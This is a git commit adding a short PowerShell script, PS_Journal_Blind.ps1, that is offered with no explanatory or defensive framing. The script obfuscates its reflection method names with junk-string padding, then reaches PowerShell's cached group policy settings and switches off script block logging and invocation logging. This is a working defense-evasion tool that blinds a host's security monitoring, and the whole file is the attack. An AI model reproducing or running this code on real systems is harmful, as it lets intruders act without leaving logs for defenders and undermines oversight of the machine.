5c5e34dc3043a62ac5efe682cf168b7686dc87f1
Anton <97513066+AntonyN0P@users.noreply.github.com>
2024-06-07 15:10:41 +0300

    Add files via upload

---
+++ PS_Journal_Blind.ps1
@@ -0,0 +1,7 @@
+﻿$oTIfm = 'ogitjRsAogitjRssogitjRssogitjRseogitjRsmogitjRsbogitjRslogitjRsy'.Replace('ogitjRs',''), 'GKbimtGGKbimteGKbimttGKbimtTGKbimtyGKbimtpGKbimteGKbimt'.Replace('GKbimt',''), 'GImsqerGGImsqereGImsqertGImsqerFGImsqeriGImsqereGImsqerlGImsqerdGImsqer'.Replace('GImsqer',''),'GGieSAeGieSAtGieSAVGieSAaGieSAlGieSAuGieSAe'.Replace('GieSA','')
+
+
+$GroupPolicySettingsField = [ref].($oTIfm[0]).($oTIfm[1])('System.Management.Automation.Utils').($oTIfm[2])('cachedGroupPolicySettings', 'NonPublic,Static'); 
+$GroupPolicySettings = $GroupPolicySettingsField.($oTIfm[3])($null)
+$GroupPolicySettings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+$GroupPolicySettings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
